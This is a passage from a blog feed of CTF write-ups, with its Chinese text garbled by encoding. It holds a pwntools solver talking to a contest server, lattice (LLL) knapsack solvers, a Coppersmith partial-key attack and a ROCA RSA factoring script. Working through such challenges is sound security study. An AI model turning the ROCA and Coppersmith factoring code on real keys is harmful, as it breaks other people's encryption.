class="line">sh=remote(<span class="string">"183.129.189.60"</span>,<span class="string">"10036"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"sha256(XXXX+"</span>)</span><br><span class="line">suffix=sh.recv(len(<span class="string">'SLhlaef5L6nM6pYx'</span>))</span><br><span class="line">sh.recvuntil(<span class="string">"== "</span>)</span><br><span class="line">cipher=sh.recv(len(<span class="string">'3ade7863765f07a3fbb9d853a00ffbe0485c30eb607105196b0d1854718a7b6c'</span>))</span><br><span class="line">sh.recvuntil(<span class="string">"XXXX: "</span>)</span><br><span class="line">proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((x + suffix).encode()).hexdigest() == cipher, string.ascii_letters + string.digits, length=<span class="number">4</span>, method=<span class="string">'fixed'</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(proof)</span><br><span class="line">sh.recvuntil(<span class="string">"knapsack.\n"</span>)</span><br><span class="line">data=[]</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    data.append(int(sh.recvline()[:<span class="number">-1</span>]))</span><br><span class="line"><span class="comment">#print(data)</span></span><br><span class="line">sh.recvuntil(<span class="string">"[+]c = "</span>)</span><br><span class="line">c = int(sh.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">if</span> enc(data,i) == c:</span><br><span class="line">        <span class="keyword">print</span> i</span><br><span class="line">        sh.sendline(hex(i)[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"no"</span></span><br><span class="line">sh.recvuntil(<span class="string">"knapsack.\n"</span>)</span><br><span class="line">data=[]</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    data.append(int(sh.recvline()[:<span class="number">-1</span>]))</span><br><span class="line"><span class="comment">#print(data)</span></span><br><span class="line"></span><br><span class="line">data.reverse()</span><br><span class="line">sh.recvuntil(<span class="string">"[+]c = "</span>)</span><br><span class="line">c = int(sh.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>])</span><br><span class="line">m=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">if</span> c&gt;=i:</span><br><span class="line">        m+=<span class="string">'1'</span></span><br><span class="line">        c-=i</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        m+=<span class="string">'0'</span></span><br><span class="line"><span class="keyword">print</span> c</span><br><span class="line"><span class="keyword">if</span> enc(data,int(m,<span class="number">2</span>)) :</span><br><span class="line">    m = m[::<span class="number">-1</span>]</span><br><span class="line">m = int(m,<span class="number">2</span>)</span><br><span class="line">sh.sendline(hex(m)[<span class="number">2</span>:])</span><br><span class="line">sh.recvuntil(<span class="string">"knapsack.\n"</span>)</span><br><span class="line">data=[]</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    data.append(int(sh.recvline()[:<span class="number">-1</span>]))</span><br><span class="line">    </span><br><span class="line">print(<span class="string">"a = "</span>+str(data).replace(<span class="string">"L"</span>,<span class="string">""</span>))</span><br><span class="line">sh.recvuntil(<span class="string">"[+]c = "</span>)</span><br><span class="line">c = int(sh.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>])</span><br><span class="line">print(<span class="string">"s = "</span>+str(c))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°æ•°æ®äº†å»ç”¨sageè§£å¯†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">m=[]</span><br><span class="line">a = </span><br><span class="line">s =</span><br><span class="line"></span><br><span class="line">for i in range(100):</span><br><span class="line">    b=[]</span><br><span class="line">    for j in range(100):</span><br><span class="line">        if i == j:</span><br><span class="line">            b.append(1)</span><br><span class="line">        else:</span><br><span class="line">            b.append(0)</span><br><span class="line">    m.append(b)</span><br><span class="line"> </span><br><span class="line">b=[]</span><br><span class="line">for i in range(100):</span><br><span class="line">    m[i].append(2**156*a[i])</span><br><span class="line">    b.append(1/2)</span><br><span class="line"></span><br><span class="line">b.append(2**156*s)</span><br><span class="line">m.append(b)</span><br><span class="line">#print(len(m[0])) </span><br><span class="line">M = matrix(QQ, m)</span><br><span class="line">v = M.LLL()[0]</span><br><span class="line">print(v)</span><br><span class="line">flag=&apos;&apos;</span><br><span class="line">for i in v[:-1]:</span><br><span class="line">    if i &lt; 0:</span><br><span class="line">        flag+=&apos;0&apos;</span><br><span class="line">    else:</span><br><span class="line">        flag+=&apos;1&apos;</span><br><span class="line">print(hex(int(flag,2))[2:])</span><br></pre></td></tr></table></figure><p>ç„¶åæäº¤ï¼Œç¢°ç‚¹è¿æ°”ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ›å°å±‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write Up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 GKCTF</title>
      <link href="/2020/05/24/2020GKCTF/"/>
      <url>/2020/05/24/2020GKCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="å°å­¦ç”Ÿçš„å¯†ç å­¦"><a href="#å°å­¦ç”Ÿçš„å¯†ç å­¦" class="headerlink" title="å°å­¦ç”Ÿçš„å¯†ç å­¦"></a>å°å­¦ç”Ÿçš„å¯†ç å­¦</h2><p>æœ€åŸºç¡€ä»¿å°„åŠ å¯†</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">''</span>.join(chr(((ord(i)-ord(<span class="string">'a'</span>) - <span class="number">6</span>))*inverse(<span class="number">11</span>,<span class="number">26</span>)%<span class="number">26</span>+ord(<span class="string">'a'</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">'welcylk'</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'flag&#123;'</span>+b64encode(flag)+<span class="string">'&#125;'</span>)</span><br></pre></td></tr></table></figure><h2 id="æ±‰å­—çš„ç§˜å¯†"><a href="#æ±‰å­—çš„ç§˜å¯†" class="headerlink" title="æ±‰å­—çš„ç§˜å¯†"></a>æ±‰å­—çš„ç§˜å¯†</h2><p>å½“é“ºå¯†ç ï¼Œç„¶åæœ‰ç‚¹è„‘æ´çš„ç§»ä½å¯†ç </p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">69</span>,<span class="number">74</span>,<span class="number">62</span>,<span class="number">67</span>,<span class="number">118</span>,<span class="number">83</span>,<span class="number">72</span>,<span class="number">77</span>,<span class="number">86</span>,<span class="number">55</span>,<span class="number">71</span>,<span class="number">57</span>,<span class="number">82</span>,<span class="number">57</span>,<span class="number">64</span>,<span class="number">63</span>,<span class="number">51</span>,<span class="number">107</span>]</span><br><span class="line">flag=''.join(chr(a[i]+(ord('f')-ord('e'))+i) for i in range(len(a)))</span><br></pre></td></tr></table></figure><h2 id="babycrypto"><a href="#babycrypto" class="headerlink" title="babycrypto"></a>babycrypto</h2><p>å·²çŸ¥pé«˜ä½ï¼Œcoppersmithï¼Œç°æˆçš„expä¸€æŠŠæ¢­</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">n = </span><br><span class="line">p = </span><br><span class="line">p_new = (p&gt;&gt;128)&lt;&lt;128</span><br><span class="line">pbits = 1024</span><br><span class="line">kbits = 128</span><br><span class="line">pbar = p_new &amp; (2^pbits-2^kbits)</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + pbar</span><br><span class="line">x0 = f.small_roots(X=2^kbits, beta=0.4)[0] <span class="comment"># find root &lt; 2^kbits with factor &gt;= n^0.4</span></span><br><span class="line">p = x0 + pbar</span><br></pre></td></tr></table></figure><p>åˆ†è§£äº†nï¼Œä¹‹åè¿™ä¸€é¢˜å°±ç»“æŸäº†</p><h2 id="Backdoor"><a href="#Backdoor" class="headerlink" title="Backdoor"></a>Backdoor</h2><p>p=k  *M + (65537 ** a %M)ï¼›ROCA, æ˜¯ä¸€ä¸ªCVEï¼Œgithubä¸Šä¹Ÿæœ‰ç°æˆè½®å­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#p,q=k*M+(65537**a %M)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Hardcoded parameters for efficiency</span></span><br><span class="line"><span class="comment"># Found using params.py</span></span><br><span class="line">param = \</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">512</span>: &#123;</span><br><span class="line">    <span class="string">"n"</span>: <span class="number">39</span>,</span><br><span class="line">    <span class="string">"a_max"</span>: <span class="number">62</span>,</span><br><span class="line">    <span class="string">"k_max"</span>: <span class="number">37</span>,</span><br><span class="line">    <span class="string">"M"</span>: <span class="number">0x924cba6ae99dfa084537facc54948df0c23da044d8cabe0edd75bc6</span>,</span><br><span class="line">    <span class="string">"M_prime"</span>: <span class="number">0x1b3e6c9433a7735fa5fc479ffe4027e13bea</span>,</span><br><span class="line">    <span class="string">"m"</span>: <span class="number">5</span>,</span><br><span class="line">    <span class="string">"t"</span>: <span class="number">6</span>,</span><br><span class="line">    <span class="string">"c_a"</span>: <span class="number">0x80000</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="number">1024</span>: &#123;</span><br><span class="line">    <span class="string">"n"</span>: <span class="number">71</span>,</span><br><span class="line">    <span class="string">"a_max"</span>: <span class="number">134</span>,</span><br><span class="line">    <span class="string">"k_max"</span>: <span class="number">37</span>,</span><br><span class="line">    <span class="string">"M"</span>: <span class="number">0x7923ba25d1263232812ac930e9683ac0b02180c32bae1d77aa950c4a18a4e660db8cc90384a394940593408f192de1a05e1b61673ac499416088382</span>,</span><br><span class="line">    <span class="string">"M_prime"</span>: <span class="number">0x24683144f41188c2b1d6a217f81f12888e4e6513c43f3f60e72af8bd9728807483425d1e</span>,</span><br><span class="line">    <span class="string">"m"</span>: <span class="number">4</span>,</span><br><span class="line">    <span class="string">"t"</span>: <span class="number">5</span>,</span><br><span class="line">    <span class="string">"c_a"</span>: <span class="number">0x40000000</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="number">2048</span>: &#123;</span><br><span class="line">    <span class="string">"n"</span>: <span class="number">126</span>,</span><br><span class="line">    <span class="string">"a_max"</span>: <span class="number">434</span>,</span><br><span class="line">    <span class="string">"k_max"</span>: <span class="number">53</span>,</span><br><span class="line">    <span class="string">"M"</span>: <span class="number">0x7cda79f57f60a9b65478052f383ad7dadb714b4f4ac069997c7ff23d34d075fca08fdf20f95fbc5f0a981d65c3a3ee7ff74d769da52e948d6b0270dd736ef61fa99a54f80fb22091b055885dc22b9f17562778dfb2aeac87f51de339f71731d207c0af3244d35129feba028a48402247f4ba1d2b6d0755baff6</span>,</span><br><span class="line">    <span class="string">"M_prime"</span>: <span class="number">0x16928dc3e47b44daf289a60e80e1fc6bd7648d7ef60d1890f3e0a9455efe0abdb7a748131413cebd2e36a76a355c1b664be462e115ac330f9c13344f8f3d1034a02c23396e6</span>,</span><br><span class="line">    <span class="string">"m"</span>: <span class="number">7</span>,</span><br><span class="line">    <span class="string">"t"</span>: <span class="number">8</span>,</span><br><span class="line">    <span class="string">"c_a"</span>: <span class="number">0x400000000</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/coppersmith.sage</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">coppersmith_howgrave_univariate</span><span class="params">(pol, N, beta, mm, tt, XX)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Coppersmith revisited by Howgrave-Graham</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    finds a solution if:</span></span><br><span class="line"><span class="string">    * b|N, b &gt;= N^beta , 0 &lt; beta &lt;= 1</span></span><br><span class="line"><span class="string">    * |x| &lt; XX</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># init</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    dd = pol.degree()</span><br><span class="line">    nn = dd * mm + tt</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># checks</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">0</span> &lt; beta &lt;= <span class="number">1</span> :</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">"beta should belongs in (0, 1]"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> pol.is_monic():</span><br><span class="line">        <span class="keyword">raise</span> ArithmeticError(<span class="string">"Polynomial must be monic."</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Coppersmith revisited algo for univariate</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># change ring of pol and x</span></span><br><span class="line">    polZ = pol.change_ring(ZZ)</span><br><span class="line">    x = polZ.parent().gen()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># compute polynomials</span></span><br><span class="line">    gg = []</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(mm):</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> range(dd):</span><br><span class="line">            gg.append((x * XX)**jj * N**(mm - ii) * polZ(x * XX)**ii)</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(tt):</span><br><span class="line">        gg.append((x * XX)**ii * polZ(x * XX)**mm)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct lattice B</span></span><br><span class="line">    BB = Matrix(ZZ, nn)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(nn):</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> range(ii+<span class="number">1</span>):</span><br><span class="line">            BB[ii, jj] = gg[ii][jj]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># LLL</span></span><br><span class="line">    BB = BB.LLL(early_red=<span class="literal">True</span>, use_siegel=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># transform shortest vector in polynomial</span></span><br><span class="line">    new_pol = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(nn):</span><br><span class="line">        new_pol += x**ii * BB[<span class="number">0</span>, ii] / XX**ii</span><br><span class="line"></span><br><span class="line">    <span class="comment"># factor polynomial</span></span><br><span class="line">    potential_roots = new_pol.roots()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [i[<span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> potential_roots]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Top level of the attack, feeds the queue for the workers</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">roca</span><span class="params">(N)</span>:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Key is not always of perfect size, infer from size</span></span><br><span class="line">  keylength = int(log(N, <span class="number">2</span>))</span><br><span class="line">  <span class="keyword">if</span> keylength &lt; <span class="number">1000</span> :</span><br><span class="line">    keylength = <span class="number">512</span></span><br><span class="line">  <span class="keyword">elif</span>  keylength &lt; <span class="number">2000</span> :</span><br><span class="line">    keylength = <span class="number">1024</span></span><br><span class="line">  <span class="keyword">elif</span> keylength &lt; <span class="number">4000</span> :</span><br><span class="line">    keylength = <span class="number">2048</span></span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    keylength = <span class="number">4096</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># bruteforce</span></span><br><span class="line">  M_prime = param[keylength][<span class="string">'M_prime'</span>]</span><br><span class="line">  c_prime = discrete_log(N, Mod(<span class="number">65537</span>, M_prime))</span><br><span class="line">  ord_prime = Zmod(M_prime)(<span class="number">65537</span>).multiplicative_order()</span><br><span class="line">  top = (c_prime + ord_prime)/<span class="number">2</span></span><br><span class="line">  beta = <span class="number">0.5</span></span><br><span class="line">  mm = param[keylength][<span class="string">'m'</span>]</span><br><span class="line">  tt = param[keylength][<span class="string">'t'</span>]</span><br><span class="line"></span><br><span class="line">  XX = int((<span class="number">2</span>*pow(N, beta)) / M_prime)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Bruteforce until p, q are found</span></span><br><span class="line">  a_prime = floor(c_prime/<span class="number">2</span>)</span><br><span class="line">  <span class="keyword">while</span> a_prime &lt; top:</span><br><span class="line"></span><br><span class="line">      <span class="comment"># Construct polynomial</span></span><br><span class="line">      m_inv = int(inverse_mod(M_prime, N))</span><br><span class="line">      k_tmp = int(pow(<span class="number">65537</span>, a_prime, M_prime))</span><br><span class="line">      known_part_pol = int(k_tmp * m_inv)</span><br><span class="line">      F = PolynomialRing(Zmod(N), implementation=<span class="string">'NTL'</span>, names=(<span class="string">'x'</span>,))</span><br><span class="line">      (x,) = F._first_ngens(<span class="number">1</span>)</span><br><span class="line">      pol = x + known_part_pol</span><br><span class="line"></span><br><span class="line">      <span class="comment"># Get roots of polynomial using coppersmith</span></span><br><span class="line">      roots = coppersmith_howgrave_univariate(pol, N, beta, mm, tt, XX)</span><br><span class="line"></span><br><span class="line">      <span class="comment"># Check if roots are p, q</span></span><br><span class="line">      <span class="keyword">for</span> root <span class="keyword">in</span> roots:</span><br><span class="line">        factor1 = k_tmp + abs(root) * M_prime</span><br><span class="line">        <span class="keyword">if</span> mod(N, factor1) == <span class="number">0</span>:</span><br><span class="line">          factor2 = N // factor1</span><br><span class="line">          <span class="keyword">return</span> int(factor1), int(factor2)</span><br><span class="line">      a_prime += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Roca</span></span><br><span class="line">p = <span class="number">135879036921529661794648581653002330298301044224526679653380767028908108252308273197382392628515754461497140112085352276569074111872088188367336757057332590938346879044292991775026289443754785127606230777989486075849384095736865778026395017314284500188674246388734465652666728075877428904646726042443084490733</span></span><br><span class="line">q = <span class="number">136030166899916836494910593158841550636266310029556929683174827580476574762487106877006810987126725903225945843864212303796002840361299997548544768590518964089753416844749381816714973552330950849352052797513575852750175731227705787558580111648617297716840633123746097117675990517245812564173658065172087693179</span></span><br><span class="line"><span class="comment">#N = p*q</span></span><br><span class="line">N=<span class="number">15518961041625074876182404585394098781487141059285455927024321276783831122168745076359780343078011216480587575072479784829258678691739</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">"[+] Factoring %i"</span> % N)</span><br><span class="line"></span><br><span class="line">factor1, factor2 = roca(N)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (<span class="string">"[+] Found factors of N:"</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"[+] p ="</span> , factor1)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"[+] q ="</span> , factor2)</span><br></pre></td></tr></table></figure><p>åˆ†è§£näº†ï¼Œè¿™ä¸€é¢˜ç»“æŸäº†ã€‚</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h2><p>è¿›bilibiliç›´æ’­é—´å¤åˆ¶</p><h2 id="PokeÌmon"><a href="#PokeÌmon" class="headerlink" title="PokeÌmon"></a>PokeÌmon</h2><p>èµ°åˆ°103ï¼Œflagç”»åœ¨åœ°æ¿ä¸Šäº†</p><h2 id="é—®å·è°ƒæŸ¥"><a href="#é—®å·è°ƒæŸ¥" class="headerlink" title="é—®å·è°ƒæŸ¥"></a>é—®å·è°ƒæŸ¥</h2><p>pass</p><h2 id="code-obfuscation"><a href="#code-obfuscation" class="headerlink" title="code obfuscation"></a>code obfuscation</h2><p>é¦–å…ˆç”¨psè°ƒå¥½</p><p><img src="https://i.loli.net/2020/05/24/2JyUPlwhucNpIqf.png" alt></p><p>ç„¶åå› ä¸ºè¿™äº›ç©ºéš™ï¼Œç›´æ¥æ‰«å¯èƒ½æ˜¯æ‰«ä¸å‡ºæ¥çš„ï¼Œè¿™è¾¹æ¨èç”¨æ”¯ä»˜å®æ‰«ç ï¼Œç„¶åæ‰«çš„æ—¶å€™æŠ–åŠ¨ä½ çš„æ‰‹æœºï¼Œè®©ç”»é¢æ¨¡ç³Šï¼ŒæŠŠç©ºéš™ç»™æŠ–æ²¡äº†å°±èƒ½æ‰«å‡ºæ¥base(gkctf)</p><p>ç„¶åè¿™å¼ å›¾ä¸‹é¢æœ‰ä¸€ä¸ªrarï¼Œç»è¿‡æµ‹è¯•å¯†ç æ˜¯base58(gkctf)ï¼Œè§£å¯†åæ˜¯ç»™äº†ä¸€ä¸²jsä»£ç ï¼Œç½‘ç«™jsè§£å¯†ååœ°å¾—åˆ°</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> a b c d e f g h i j k l m n o p q r s t u v w x y z <span class="keyword">do</span> <span class="keyword">eval</span> An = <span class="string">"n"</span></span><br><span class="line">    done</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> A B C D E F G H I J K L M N O P Q R S T U V W X Y Z <span class="keyword">do</span> <span class="keyword">eval</span> An = <span class="string">"n"</span></span><br><span class="line">    done</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> a b c d e f g h i j <span class="keyword">do</span> <span class="keyword">eval</span> Bn = <span class="string">"n"</span></span><br><span class="line">    num =</span><br><span class="line">    $((num + <span class="number">1</span>)) done alert(<span class="string">"Bk=' ';Bm='"</span><span class="string">';Bn='</span>#<span class="string">';Bs='</span> (<span class="string">';Bt='</span>)<span class="string">';By='</span>.<span class="string">';Cb='</span>;<span class="string">';Cc='</span> &lt; <span class="string">';Ce='</span> &gt; <span class="string">';Cl='</span>_<span class="string">';Cn='</span>&#123;<span class="string">';Cp='</span>&#125;<span class="string">';Da='</span><span class="number">0</span> <span class="string">';Db='</span><span class="number">1</span> <span class="string">';Dc='</span><span class="number">2</span> <span class="string">';Dd='</span><span class="number">3</span> <span class="string">';De='</span><span class="number">4</span> <span class="string">';Df=5 '</span>;Dg=<span class="string">'6 '</span>;Dh=<span class="string">'7 '</span>;Di=<span class="string">'8 '</span>;Dj=<span class="string">'9 '</span>;<span class="string">")</span></span><br></pre></td></tr></table></figure><p>å­—ç¬¦æ›¿æ¢ï¼Œç»“åˆ<img src="https://i.loli.net/2020/05/24/ZoXt8ODkK2bvqIy.png" alt></p><p>å¾—åˆ°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">print(<span class="string">"w3lc0me_4o_9kct5"</span>);</span><br><span class="line">retrun <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Harley-Quinn"><a href="#Harley-Quinn" class="headerlink" title="Harley Quinn"></a>Harley Quinn</h2><p>é¦–å…ˆç”¨AUæŠŠéŸ³é¢‘åˆ‡æ‰ï¼Œå¾—åˆ°æœ€åçš„ç”µè¯éŸ³ï¼Œç„¶åç”¨dtmf2numå¾—åˆ°é‚£ä¸€ä¸²æ•°å­—</p><p>ç„¶å9é”®é”®ç›˜åŠ å¯†å¾—åˆ°ctfisfunï¼Œå†ç”¨hintç»™çš„å·¥å…·è§£å¯†å“ˆä¸½å¥å› é‚£å¼ å›¾ï¼Œå¾—åˆ°flag.txt</p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Check-1n"><a href="#Check-1n" class="headerlink" title="Check_1n"></a>Check_1n</h2><p>idaæ‰“å¼€ï¼Œæœç´¢è§£å¯†å¤±è´¥æ‰¾åˆ°å¯†ç 